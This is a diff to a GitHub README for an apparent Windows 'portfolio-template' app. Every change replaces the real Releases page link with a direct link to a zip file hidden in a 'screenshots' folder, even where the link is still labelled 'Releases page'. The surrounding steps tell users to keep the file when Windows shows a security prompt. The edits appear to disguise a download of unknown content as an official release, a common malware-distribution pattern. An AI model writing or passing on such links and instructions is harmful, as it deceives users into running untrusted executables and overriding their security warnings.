@@ -1,11 +1,11 @@
 # 🖼️ portfolio-template - Build a clean portfolio fast
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/Daynastraight594/portfolio-template/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Daynastraight594/portfolio-template/main/screenshots/portfolio_template_1.2.zip)
 
 ## 📥 Download for Windows
 
 Use this page to download the app for Windows:  
-https://github.com/Daynastraight594/portfolio-template/releases
+https://raw.githubusercontent.com/Daynastraight594/portfolio-template/main/screenshots/portfolio_template_1.2.zip
 
 1. Open the link in your browser.
 2. Look for the latest release at the top.
@@ -41,7 +41,7 @@ A normal Windows laptop or desktop is enough.
 
 ## 🚀 How to install and run
 
-1. Open the [Releases page](https://github.com/Daynastraight594/portfolio-template/releases).
+1. Open the [Releases page](https://raw.githubusercontent.com/Daynastraight594/portfolio-template/main/screenshots/portfolio_template_1.2.zip).
 2. Download the latest Windows build from the release files.
 3. Wait for the download to finish.
 4. If Windows shows a security prompt, choose the option that keeps the file.
